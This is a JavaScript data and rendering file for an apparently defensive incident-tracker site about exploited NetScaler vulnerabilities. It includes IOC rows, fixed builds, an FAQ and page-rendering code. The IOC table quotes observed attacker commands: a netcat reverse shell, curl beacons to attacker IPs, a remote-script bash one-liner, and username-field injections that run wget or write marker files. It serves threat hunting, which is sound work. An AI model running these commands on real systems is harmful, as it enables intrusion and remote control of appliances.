  { type: 'Domain', value: 'white-guard.pro', context: 'Resolves to the primary C2 node', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Domain', value: 'garyvard.com', context: 'Listed in the cluster certificate SANs; TENEX assesses it operator-associated with moderate confidence (a SAN entry alone does not prove control)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Domain', value: 'hickoryusedauto.com', context: 'Listed in the cluster certificate SANs; TENEX assesses it operator-associated with moderate confidence (a SAN entry alone does not prove control)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Domain', value: 'gurerasfalt.com', context: 'Listed in the cluster certificate SANs; TENEX assesses it operator-associated with moderate confidence (a SAN entry alone does not prove control)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Domain', value: 'rockinroyaltykids.com', context: 'Listed in the cluster certificate SANs; TENEX assesses it operator-associated with moderate confidence (a SAN entry alone does not prove control)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Domain', value: 'currydownsrvpark.com', context: 'Listed in the cluster certificate SANs; TENEX assesses it operator-associated with moderate confidence (a SAN entry alone does not prove control)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'TLS cert SHA-256', value: '38b7c597c3f33f2caa2b2de9873f15cf9cb9984b0eacb801ef4b654a96ba9bd0', context: 'Shared cluster certificate (subject platypus-ingress, issuer Platypus project default); ties the four C2 nodes together', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Cert URI SAN', value: 'platypus://server/default', context: 'Platypus framework certificate identity scheme; hunt by pattern, not only the exact fingerprint', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Signing key', value: 'S8GEj/Ibzw/Zy9Z5u4saQyn0h59enf9Mk3J2m70tTMs=', context: 'Ed25519/minisign public key embedded in every agent build; the best cross-build pivot', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Build fingerprint', value: '0.1.0-SNAPSHOT-4b91c7db', context: 'Newer agent build, compiled 2026-09-28', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Build fingerprint', value: '0.1.0-SNAPSHOT-697ffe7c', context: 'Earlier agent build, compiled 2026-09-08, same operator signing key', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'SHA-256', value: 'c98aee75c5e199c9b5527984ce48675d665963f7cab8ce9f2e82465de6b58727', context: 'Platypus agent, freebsd/amd64 (the appliance-relevant build)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'SHA-256', value: '89b64bd45478e53299f9c422cbba40fac3ac0712b551b85185e38203f7f984c6', context: 'Platypus agent, linux/amd64 (current build)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'SHA-256', value: 'be5832f3993ff63a36100b2f7b89c8d385e20dd9d72876700e7ade9fb9e6d4cb', context: 'Platypus agent, UPX-packed Linux x86-64; earlier build', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'SHA-256', value: '0dcac605a3a0c37001552369a6a77003226b35ddee7710b554fcd0e6809a76d1', context: 'Platypus agent, windows/amd64', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'SHA-256', value: '04db3fc44c81886844ef47949d7f352953a6bf1be4866be1fb3e7e12c452e3ac', context: 'Platypus agent, darwin/arm64', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'SHA-256', value: '2d2c2f6842982f7e1cb894ce915d39f2a9861009c7ecb1b90da803f2c3c608f4', context: 'Platypus agent, linux/amd64 unpacked (more stable than the packed hashes)', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'HTTP request', value: 'POST /api/v1/agents/enroll with Content-Type application/x-protobuf-platypus-v2', context: 'Platypus agent enrollment; the content type is highly distinctive', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'URI path', value: '/api/v1/agent/link', context: 'Platypus WebSocket tasking channel over mutual TLS', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Network fingerprint', value: '_platypus-mesh._tcp (mDNS, UDP/5353)', context: 'LAN peer discovery in cleartext; the easiest way to find a second infected host on the same segment', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'User-Agent', value: 'platypus-agent/public-ip-probe', context: 'Platypus agent public-IP probe', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'File path', value: '/netscaler.local/', context: 'Operator-created binary directory, not part of the stock NetScaler layout', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'File name', value: 'ns_*.pl', context: 'Agent renamed as a NetScaler-style Perl script; the number is per install, so hunt the pattern and check content', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'File path', value: '/var/core/.ns-cache/ (client.crt, client.key, agent.lock, state.db)', context: 'Agent working directory; the client certificate and key exist only if enrollment completed, and they survive a firmware upgrade', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Username', value: 'scanner-probe', context: 'Submitted to the authentication virtual server for reconnaissance just before the injection attempts', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'File path', value: '/.x', context: 'Stager written by the injected shell-loader command and then run with sh', caveat: TEN_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'IPv4', value: '199.233.217.13', context: 'Check-in over TCP/8080 (/hi, /hi/<ip>) and a netcat reverse shell to TCP/8000', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'IPv4', value: '130.94.20.222', context: 'Silent beacon to :8888/c/<hex>', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Command', value: 'nc 199.233.217.13 8000 -e /bin/sh', context: 'Netcat reverse shell', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Command', value: 'curl http://199.233.217.13:8080/hi/', context: 'Attacker check-in to fresh infrastructure', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Command', value: 'curl -m 8 -sk http://130.94.20.222:8888/c/<hex> -o /dev/null', context: 'Silent beacon that confirms reachability without saving output', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Command', value: 'bash -c $(curl -fsSL https://gsocket.io/y)', context: 'One-line Global Socket Toolkit deploy with an S=<hex> key. gsocket.io is a legitimate service abused here, so do not block the domain', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'Command', value: 'whoami; id>/netscaler/ns_gui/vpn/id009.txt; id>/netscaler/ns_gui/id009.txt', context: 'Execution check that writes id output to a web-readable appliance path', caveat: TEN_OPP_CAVEAT, cite: ['tenex'], share: TEN_SHARE },
  { type: 'File path', value: '/var/tmp/watchTowr', context: 'README example output path of the CVE-2026-88771 detection tool (id>/var/tmp/watchTowr)', caveat: 'Test marker from a public watchTowr detection tool (README example path). A hit means someone ran the tool, possibly a defender, not necessarily an attacker. The operator can choose any path.', cite: ['wt1tool'], share: 'Public GitHub repository, no TLP marking' },
  { type: 'File path', value: '/tmp/watchTowr', context: 'README example output path of the CVE-2026-88772 (DTLS) detection tool; the example writes a 7-byte file', caveat: 'Test marker from a public watchTowr detection tool (README example path). A hit means someone ran the tool, possibly a defender, not necessarily an attacker. The operator can choose any path.', cite: ['wt2tool'], share: 'Public GitHub repository, no TLP marking' },
  { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;printf wt88771mbw9drneqklf>/var/netscaler/logon/themes/wt88771mbw9drneqklf.txt;# X', context: 'Injected username that writes a marker file into the logon themes directory (execution test)', caveat: RD_CAVEAT, cite: ['redditasm'], share: RD_SHARE },
  { type: 'File path', value: '/var/netscaler/logon/themes/wt88771mbw9drneqklf.txt', context: 'Marker file created by the command above; hunt for wt88771*.txt under /var/netscaler/logon/themes/', caveat: RD_CAVEAT, cite: ['redditasm'], share: RD_SHARE },
  { type: 'Log string', value: 'pitboss PPE unexpectedly died NSPPE;wget http://31.56.197.72:9090/lula;# X', context: 'Payload retrieval from 31.56.197.72, also described by LevelBlue; the same host appears in the Arctic Wolf and TENEX data', caveat: RD_CAVEAT + ' The wget line itself matches LevelBlue\'s published example.', cite: ['redditasm', 'levelblue'], share: RD_SHARE },
  { type: 'IPv4', value: '213.209.159.55', context: 'Payload server named in screenshots of a write-up attached to the Beaumont post (author not named): crafted SAML-factor usernames on two 14.1-73.37 appliances made them fetch a payload from it over plain HTTP on TCP 443 (paths under /t/), save it as /v and run it. The incoming request source was not identified. AS208137, Feo Prest SRL, Germany.', caveat: 'Unverified. The write-up itself says it shows exploitation attempts and correlated crashes, not confirmed command execution, a specific CVE or a firmware regression. No vendor or CERT has confirmed it. A hunting lead, not a blocklist entry.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
  { type: 'Domain', value: 'pyrlnk.cc', context: 'Edit in the same write-up: attackers moved to *.pyrlnk.cc as the attempted payload delivery source', caveat: 'Unverified; spelling read from the screenshot. Poppelgaard spells it pylrk.cc (see that row), so confirm against the original before blocking. Check DNS and proxy logs rather than relying on this one string.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
  { type: 'Domain', value: 'pylrk.cc', context: 'Download server seen in attack attempts on 2 Oct, according to Poppelgaard (article and checker release 1.11). The screenshots in the Beaumont post spell it pyrlnk.cc, so the two may be the same domain with one spelling wrong.', caveat: 'Unverified single-source report; the spelling conflict is unresolved. VirusTotal shows the domain with 1 of 91 engines flagging it, which is weak evidence. Check DNS and proxy logs for both spellings rather than relying on one string.', cite: ['poppel', 'poppchecker'], share: 'Public blog and GitHub release' },
  { type: 'File path', value: '/v', context: 'Payload file the injected commands save at the filesystem root and execute (same write-up) Poppelgaard separately describes a bot sending fetch -qo /v with an http URL on port 443 and then sh /v, using IFS instead of spaces.', caveat: 'Unverified. A missing /v does not rule out earlier execution or cleanup, as the write-up itself notes.', cite: ['kb12', 'poppel'], share: 'Public Mastodon post (screenshots)' },
  { type: 'URI path', value: '/t/', context: 'Paths under /t/ on 213.209.159.55:443 (plain HTTP) used for the payload downloads Poppelgaard describes the same /t/<hex> download path from a bot.', caveat: 'Unverified, single write-up. A short generic path, so only meaningful together with the IP.', cite: ['kb12', 'poppel'], share: 'Public Mastodon post (screenshots)' },
  { type: 'File name', value: 'nsaaad-*.gz', context: 'Core dumps of the authentication daemon in recently modified numbered directories under /var/core after repeated crashes (exit status 0x8a, restart limit 6, then a reboot)', caveat: 'Unverified. Crashes have other causes; a match is a reason to preserve logs and cores and involve Citrix Support, not proof of compromise.', cite: ['kb12'], share: 'Public Mastodon post (screenshots)' },
  { type: 'Config pattern', value: 'add authentication samlAction.*', context: 'Citrix: an appliance with this line (NetScaler as SAML service provider) on a Gateway or AAA virtual server is affected by the new SAML issue', caveat: 'Applicability check from Citrix, not an indicator of compromise.', cite: ['citrixsaml'], share: 'Public vendor blog, no TLP marking' },
  { type: 'Config pattern', value: 'add authentication samlIdPProfile.*', context: 'Citrix: an appliance with this line (NetScaler as SAML identity provider) is affected by the new SAML issue', caveat: 'Applicability check from Citrix, not an indicator of compromise.', cite: ['citrixsaml'], share: 'Public vendor blog, no TLP marking' },
  { type: 'Log pattern', value: 'proc nsaaad.*(SIGNALED|EXITED)|maximum number of restarts|Pitboss declaring system failure|All monitored processes have exited, rebooting', context: 'Grep from the Beaumont post for authentication-daemon crashes and the resulting restart or reboot, run against /var/log/ns.log', caveat: 'Beaumont own pattern. A match means the daemon crashed or the appliance restarted, which has other causes too; it is not proof of an attack.', cite: ['kb12'], share: 'Public Mastodon post' }
];

/* ---------- Fixed builds, exactly as in CTX697096 ---------- */
var BUILDS = [
  'NetScaler ADC/Gateway 14.1-73.37 and later',
  'NetScaler ADC/Gateway 13.1-64.23 and later',
  'NetScaler ADC 14.1-FIPS 14.1-73.37 FIPS and later',
  'NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1.37.279 and later'
];

/* ---------- FAQ: short sourced answers (also emitted as FAQPage JSON-LD) ---------- */
var FAQ = [
  { q: 'Is there a new NetScaler issue involving SAML?', cite: ['citrixsaml', 'kb12', 'kb13'],
    a: 'Citrix published guidance on 2 Oct 2026 for a newly observed, configuration-dependent issue in NetScaler deployments that use SAML authentication on a Gateway or AAA virtual server. It says the issue is independent of CTX697096 and that a security bulletin and product update are planned. No CVE, affected versions or fixed builds were listed yet. Beaumont reports his patched honeypots crashing, which is one researcher\'s observation. This site covers CVE-2026-88771 and CVE-2026-88772; the SAML issue is not part of CTX697096.' },
  { q: 'What is PitScaler?', cite: ['kb4', 'citrix'],
    a: 'PitScaler is the name Kevin Beaumont gave on 28 Sep 2026 to the exploitation of Citrix NetScaler ADC and NetScaler Gateway zero-days CVE-2026-88771 and CVE-2026-88772. Citrix disclosed them, with six other CVEs, in bulletin CTX697096 on 27 Sep 2026.' },
  { q: 'Which NetScaler vulnerabilities are exploited?', cite: ['citrix', 'kev', 'kb1'],
    a: 'CVE-2026-88771 (unauthenticated remote command execution in the default configuration, CVSS 4.0 9.5) and CVE-2026-88772 (DTLS memory overflow leading to RCE or DoS, CVSS 4.0 9.5). CISA added both to its KEV catalog on 27 Sep 2026 with a 30 Sep deadline. Kevin Beaumont reports CVE-2026-88773 was chained with the two, but no other source has independently confirmed that. No exploitation is reported for CVE-2026-88774 to CVE-2026-88778.' },
  { q: 'Which NetScaler versions fix CVE-2026-88771 and CVE-2026-88772?', cite: ['citrix'],
    a: 'Per CTX697096: NetScaler ADC/Gateway 14.1-73.37 and later; 13.1-64.23 and later; ADC 14.1-FIPS 14.1-73.37 FIPS and later; ADC 13.1-FIPS and 13.1-NDcPP 13.1.37.279 and later (the bulletin also writes this build as 13.1-37.279).' },
  { q: 'Does patching remove a NetScaler backdoor?', cite: ['kb2', 'gtig', 'certeu'],
    a: 'No. Patching closes the vulnerabilities but does not remove webshells or configuration changes planted before the update. Check for compromise and preserve evidence (logs, memory, a VM snapshot) before patching, then patch.' },
  { q: 'How do I check a NetScaler for compromise?', cite: ['gtig', 'certeu', 'gnblog', 'kb5'],
    a: 'Look for AddHandler or AliasMatch changes in httpd.conf that make non-PHP files run as PHP; PHP code in VPN script and media directories such as /var/netscaler/gui/vpn/scripts/linux/; a setuid bit on /bin/sh; /tmp/.uxdport and /tmp/.uxdlock (SLAPSHOT); and DTLSv1.0 SSL_HANDSHAKE_FAILURE log entries followed by an NSPPE crash. Beaumont reports that the Citrix checker misses the /bin/sh setuid check, so a clean scan does not clear a host.' },
  { q: 'When did the exploitation start?', cite: ['esentire', 'gtig', 'acsc', 'gnblog'],
    a: 'Unit 42 traces version fingerprinting from 21 Aug 2026 (not exploitation) and .deb webshell requests from 4 Sep. eSentire saw CVE-2026-88771 exploited as early as 5 Sep 2026, more than three weeks before disclosure, and Google GTIG and Mandiant report CVE-2026-88772 exploitation since at least early September. Australia\'s ACSC advises reviewing for compromise since at least 4 Sep 2026. GreyNoise recorded a CVE-2026-88771 attempt on 24 Sep 2026.' },
  { q: 'Who is behind the attacks?', cite: ['beazley', 'kb1', 'helpnet930'],
    a: 'No vendor has publicly attributed the activity to a named threat actor as of 1 Oct 2026. Mandiant\'s CTO says advanced and suspected state-sponsored actors are likely behind the initial targeted CVE-2026-88772 intrusions, without naming one, and Kevin Beaumont calls the attackers probably nation-state aligned. Both are assessments, not a confirmed attribution.' },
  { q: 'Should I shut down or disconnect my NetScaler?', cite: ['nlgov', 'ingdk', 'bleeping', 'gtig'],
    a: 'Before patches existed, many organisations were advised to shut down or disconnect NetScaler appliances: the Dutch central government applied "disconnect unless" from 26 Sep 2026, and Danish agencies including PET, the Armed Forces and the police switched theirs off. Now that fixed builds exist, GTIG/Mandiant recommend upgrading, isolating only appliances with confirmed or suspected compromise, and, if patching is delayed, disabling DTLS or blocking inbound UDP/443 upstream (this mitigates CVE-2026-88772 only, not CVE-2026-88771).' },
  { q: 'Were CVE-2026-88771 and CVE-2026-88772 exploited as zero-days?', cite: ['citrix', 'esentire', 'gnblog'],
    a: 'Yes. Citrix confirmed exploitation on unmitigated appliances when it disclosed them on 27 Sep 2026. eSentire saw CVE-2026-88771 exploited from 5 Sep, and GreyNoise recorded an attempt on 24 Sep, before any patch or CVE was public.' },
  { q: 'Who found the NetScaler zero-days?', cite: ['bleeping', 'watchtowrx', 'citrix', 'stack'],
    a: 'The exploited flaws were found during incident response: BleepingComputer reports Citrix discovered them while investigating incidents at customers, and watchTowr says they were discovered during forensics. The CTX697096 bulletin credits Michael Tucker, Chew Keong Tan and Alex Bernier of the JPMorgan Chase XOR Team, and Maxim Suhanov, without saying which CVE each reported. The Stack reports it understands the JPMorgan team disclosed the vulnerabilities, and says it could not independently confirm a disclosure timeline.' },
  { q: 'Is PitScaler a live incident feed?', cite: ['citrix', 'cisa'],
    a: 'No. PitScaler is an independent historical snapshot, last updated {{UPDATED_HUMAN}}. Check official advisories such as Citrix CTX697096 and the CISA alert for current status.' },
  { q: 'How many NetScaler appliances are exposed?', cite: ['censys', 'unit42', 'cydive'],
    a: 'Censys counted 42,735 NetScaler hosts on 28 Sep 2026, Unit 42 counted 50,277 potentially vulnerable exposed instances on 27 Sep, and Shadowserver reports more than 20,000 instances exposed and potentially at risk. These are exposure counts, not confirmed compromises.' }
];

/* Keep the timeline chronological: by date, then time; untimed entries go last within their day (stable sort). */
TIMELINE.sort(function (a, b) {
  var ka = a.date + (a.time || '24:00'), kb = b.date + (b.time || '24:00');
  return ka < kb ? -1 : ka > kb ? 1 : 0;
});

/* ================= Rendering (no innerHTML with data) ================= */
function h(tag, attrs, kids) {
  var el = document.createElement(tag);
  if (attrs) for (var k in attrs) {
    if (k === 'text') el.textContent = attrs[k];
    else if (k === 'cls') el.className = attrs[k];
    else el.setAttribute(k, attrs[k]);
  }
  (kids || []).forEach(function (c) { if (c != null) el.appendChild(typeof c === 'string' ? document.createTextNode(c) : c); });
  return el;
}
/* Wiki-style reference numbers: category order, then declaration order (same algorithm in build.mjs) */
var REF_ORDER = [];
SOURCE_CATS.forEach(function (c) { Object.keys(SOURCES).forEach(function (id) { if (SOURCES[id].cat === c[0]) REF_ORDER.push(id); }); });
var REFNO = {};
REF_ORDER.forEach(function (id, i) { REFNO[id] = i + 1; });
function refLink(id) { return h('a', { href: '#ref-' + REFNO[id], title: SOURCES[id].label, text: '[' + REFNO[id] + ']' }); }
function citeLinks(ids) {
  var sup = h('sup', { cls: 'ref' });
  ids.forEach(function (id) { sup.appendChild(refLink(id)); });
  return h('span', null, [' ', sup]);
}
function shortName(id) {
  var s = SOURCES[id];
  if (s.cat === 'beaumont') return 'Beaumont';
  return s.label.split(' - ')[0].replace(/ \(.*$/, '');
}
function slug(e) { return 'tl-' + e.date + '-' + e.title.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 48).replace(/-$/, ''); }
function fmtDate(iso) {
  var m = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  var p = iso.split('-');
  return m[+p[1] - 1] + ' ' + (+p[2]);
}

/* CVEs */
(function () {
  var box = document.getElementById('cve-list');
  box.replaceChildren();
  CVES.forEach(function (c) {
    var dl = h('dl');
    c.rows.forEach(function (r) {
      dl.appendChild(h('dt', { text: r[0] }));
      dl.appendChild(h('dd', null, [r[1], citeLinks(r[2])]));
    });
    box.appendChild(h('article', { id: c.id.toLowerCase(), cls: 'cve ' + c.kind }, [
      h('div', { cls: 'cve-head' }, [
        h('h3', null, [h('a', { href: '/' + c.id.toLowerCase() + '/', text: c.id })]),
        h('span', { cls: 'tag ' + ({ hot: 'tag-danger', chain: 'tag-reported' }[c.kind] || 'tag-research'), text: c.status }),
        h('span', { cls: c.kind === 'other' ? 'note' : 'score', text: c.score })
      ]),
      dl
    ]));
  });
})();

/* Timeline */
(function () {
  var list = document.getElementById('tl-list');
  list.replaceChildren();
  var count = document.getElementById('tl-count');
  var LABEL = { official: 'Official advisory', research: 'Research', telemetry: 'Telemetry', reported: 'Reported observation' };
  TIMELINE.forEach(function (e, i) {
    var dateTxt = (e.approx ? '~' : '') + fmtDate(e.date) + (e.time ? ', ' + e.time + ' UTC' : '');
    var tags = [h('span', { cls: 'tag tag-' + e.kind, text: LABEL[e.kind] })];
    if (e.deadline) tags.push(h('span', { cls: 'tag tag-deadline', text: 'Deadline' }));
    if (e.approx) tags.push(h('span', { cls: 'tag tag-reported', text: 'Approximate date' }));
    if (e.unverified) tags.push(h('span', { cls: 'tag tag-danger', text: e.unverifiedLabel || 'Unverified claim' }));
    if (e.validated) tags.push(h('span', { cls: 'tag tag-official', text: 'Validated' }));
    var srcs = h('ul');
    e.cite.forEach(function (id) {
      var s = SOURCES[id];
      srcs.appendChild(h('li', null, [refLink(id), ' ', h('a', { href: s.url, text: s.label }), s.pending ? ' ' : null, s.pending ? h('span', { cls: 'pending', text: 'verification pending' }) : null]));
    });
    var kids = [
      h('div', null, [h('time', { cls: 'chip', datetime: e.date + (e.time ? 'T' + e.time + 'Z' : ''), text: dateTxt })].concat(tags)),
      h('p', { cls: 'tl-title', text: e.title })
    ];
    if (e.quote) kids.push(h('p', { cls: 'tl-body' }, [h('q', { text: e.quote })]));
    kids.push(h('p', { cls: 'tl-body', text: e.body }));
    if (e.validated) kids.push(h('p', { cls: 'note', text: e.validated }));
    kids.push(h('details', null, [h('summary', { text: 'Sources (' + e.cite.length + ')' }), srcs]));
    list.appendChild(h('li', { cls: 'k-' + e.kind + (e.deadline ? ' deadline' : ''), 'data-kind': e.kind, id: slug(e) }, kids));
  });
  var btns = document.querySelectorAll('.filters button');
  function apply(f) {
    var n = 0;
    Array.prototype.forEach.call(list.children, function (li) {
      var show = f === 'all' || li.getAttribute('data-kind') === f;
      li.hidden = !show; if (show) n++;
    });
    btns.forEach(function (b) { b.setAttribute('aria-pressed', String(b.getAttribute('data-filter') === f)); });
    count.textContent = 'Showing ' + n + ' of ' + TIMELINE.length + ' events.';
  }
  btns.forEach(function (b) { b.addEventListener('click', function () { apply(b.getAttribute('data-filter')); }); });
  apply('all');
})();

/* IoCs */
(function () {
  var body = document.getElementById('ioc-body');
  body.replaceChildren();
  var q = document.getElementById('ioc-q');
  var count = document.getElementById('ioc-count');
  IOCS.forEach(function (r) {
    var btn = h('button', { type: 'button', cls: 'copy', 'aria-label': 'Copy ' + r.type + ' value', text: 'Copy' });
    btn.addEventListener('click', function () {
      var done = function (ok) { btn.textContent = ok ? 'Copied' : 'Select + copy'; setTimeout(function () { btn.textContent = 'Copy'; }, 1500); };
      if (navigator.clipboard) navigator.clipboard.writeText(r.value).then(function () { done(true); }, function () { done(false); });
      else done(false);
    });
    var srcCell = h('td');
    r.cite.forEach(function (id, i) {
      var s = SOURCES[id];
      if (i) srcCell.appendChild(document.createTextNode('; '));
      srcCell.appendChild(h('a', { href: '#ref-' + REFNO[id], title: s.label, text: (shortName(id) === 'GreyNoise' ? 'GreyNoise blog' : s.label.split(' - ')[0]) + ' [' + REFNO[id] + ']' }));
      if (s.pending) { srcCell.appendChild(document.createTextNode(' ')); srcCell.appendChild(h('span', { cls: 'pending', text: 'verification pending' })); }
    });
    var tr = h('tr', null, [
      h('td', { text: r.type }),
      h('td', null, [h('div', { cls: 'val' }, [h('code', { text: r.value }), btn])]),
      srcCell,
      h('td', { text: r.context }),
      h('td', { text: r.caveat }),
      h('td', { text: r.share })
    ]);
    tr.setAttribute('data-search', (r.type + ' ' + r.value + ' ' + r.context).toLowerCase());
    body.appendChild(tr);
  });
  function filter() {
    var t = q.value.trim().toLowerCase(), n = 0;
    Array.prototype.forEach.call(body.children, function (tr) {
      var show = !t || tr.getAttribute('data-search').indexOf(t) !== -1;
      tr.hidden = !show; if (show) n++;
    });
    count.textContent = n + ' of ' + IOCS.length + ' indicators shown. No match in this table does not mean a host is clean.';
  }
  q.addEventListener('input', filter);
  filter();
})();

/* Builds */
(function () {
  var body = document.getElementById('build-body');
  body.replaceChildren();
  BUILDS.forEach(function (b) { body.appendChild(h('tr', null, [h('td', { text: b })])); });
})();

/* References table */
(function () {
  var body = document.getElementById('ref-body');
  body.replaceChildren();
  var CAT = {};
  SOURCE_CATS.forEach(function (c) { CAT[c[0]] = c[1].split(' - ')[0].replace(/ \(.*$/, ''); });
  REF_ORDER.forEach(function (id) {
    var s = SOURCES[id];
    body.appendChild(h('tr', { id: 'ref-' + REFNO[id] }, [
      h('td', { text: String(REFNO[id]) }),
      h('td', null, [h('a', { href: s.url, text: s.label }), s.pending ? ' ' : null, s.pending ? h('span', { cls: 'pending', text: 'verification pending' }) : null]),
      h('td', { text: CAT[s.cat] }),
      h('td', { cls: 'url' }, [h('code', { text: s.url })])
    ]));
  });
})();

/* FAQ */
(function () {
  var box = document.getElementById('faq-list');
  box.replaceChildren();
  FAQ.forEach(function (f) {
    box.appendChild(h('div', { cls: 'faq' }, [h('h3', { text: f.q }), h('p', null, [f.a, citeLinks(f.cite)])]));
  });
})();
